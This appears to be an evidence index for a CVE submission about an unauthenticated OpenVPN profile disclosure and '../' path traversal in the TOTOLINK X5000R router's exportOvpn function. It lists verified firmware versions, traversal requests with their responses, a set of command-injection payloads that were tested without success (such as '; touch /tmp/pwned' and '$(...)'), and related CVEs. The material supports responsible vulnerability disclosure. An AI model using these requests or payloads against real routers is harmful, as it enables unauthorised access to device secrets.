# Evidence Index

## Primary Materials

- `README.md`: concise English submission summary.
- `CVE_FORM.md`: field-oriented CVE/CNA form draft.
- `SUBMISSION_CHECKLIST.md`: submission readiness checklist.
- `TOTOLINK_X5000R_exportOvpn_verified_report_2026-06-08.md`: primary verified report.
- `inout/vulndb/TOTOLINK_X5000R_exportOvpn_pre_auth_file_disclosure_verified_2026-06-08.md`: additional Chinese verification report.

## PoC

```text
pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
```

PoC syntax check performed:

```text
python -m py_compile pocs/totolink_x5000r_exportovpn_pre_auth_file_disclosure.py
```

Result: passed.

## Dynamic Verification

Script:

```text
scripts/probe_totolink_exportovpn_versions.sh
```

Evidence:

```text
inout/work/deepdive/exportovpn_versions/combined_evidence.txt
```

Confirmed behavior:

```text
exportOvpn&type=user&name=alice&mode=config
HTTP/1.1 200 OK
OVPN_SECRET_FOR_ALICE

exportOvpn&type=user&name=alice&filetype=gz
HTTP/1.1 200 OK
TARGZ_SECRET_FOR_ALICE

exportOvpn&type=user&name=../passwd&mode=config
HTTP/1.1 200 OK
TRAVERSAL_SECRET

exportOvpn&type=user&name=../passwd&filetype=gz
HTTP/1.1 200 OK
TRAVERSAL_GZ_SECRET
```

Command log confirms branch reachability and username flow:

```text
openvpn-cert build_user alice config
openvpn-cert build_user alice gz
openvpn-cert build_user ../passwd config
openvpn-cert build_user ../passwd gz
```

Verified versions:

```text
V9.1.0cu.2415_B20250515
V9.1.0cu.2350_B20230313
```

## Static Evidence

Scripts:

```text
scripts/analyze_totolink_exportovpn_static.sh
scripts/inspect_totolink_openvpn_related.sh
```

Evidence:

```text
inout/work/deepdive/exportovpn_static/combined_static.txt
inout/work/deepdive/exportovpn_related/evidence.txt
```

Relevant strings:

```text
exportOvpn
openvpn-cert build_user %s gz
/etc/openvpn/server/user/%s.tar.gz
openvpn-cert build_user %s config
/etc/openvpn/server/user/%s.ovpn
can not open config file
```

## RCE Boundary Evidence

Scripts:

```text
scripts/probe_totolink_exportovpn_rce_attempts.sh
scripts/test_totolink_shell_metachar_runtime.sh
scripts/probe_totolink_exportovpn_real_shell_rce.sh
```

Evidence:

```text
inout/work/deepdive/exportovpn_rce_attempts/combined_evidence.txt
inout/work/deepdive/shell_meta_runtime/evidence.txt
inout/work/deepdive/exportovpn_real_shell_rce/combined_evidence.txt
```

Tested payload categories:

```text
; touch /tmp/pwned
| touch /tmp/pwned
`touch /tmp/pwned`
$(touch /tmp/pwned)
raw LF
raw CR
raw tab
space argument injection
URL-encoded %3b, %7c, %26, %0a
filetype/type parameter injection
```

Conclusion:

```text
Current evidence does not support an RCE claim.
Submit as file disclosure and suffix-constrained path traversal.
```

## Submission Risk Notes

Known related CVEs should be mentioned proactively to reduce duplicate confusion:

```text
CVE-2025-14586: exportOvpn command injection on a different public version
CVE-2025-13184: action=telnet unauthenticated Telnet enablement
CVE-2025-9934: cstecgi.cgi command injection affecting V9.1.0cu.2415_B20250515
```

Differentiation:

```text
This candidate is not Telnet enablement and not RCE. The verified behavior is unauthenticated OpenVPN profile/archive disclosure plus ../ traversal with forced .ovpn or .tar.gz suffixes.
```

